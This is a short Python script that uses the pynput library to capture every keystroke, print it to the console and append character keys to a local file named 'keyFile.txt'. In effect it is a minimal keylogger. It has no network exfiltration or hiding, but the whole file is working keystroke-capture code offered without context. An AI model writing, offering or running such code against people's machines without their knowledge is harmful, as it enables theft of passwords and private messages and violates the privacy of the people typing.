from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open('keyFile.txt', 'a') as logkey:
        try: 
            char = key.char
            logkey.write(char)
        except:
            print('error getting a char')

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

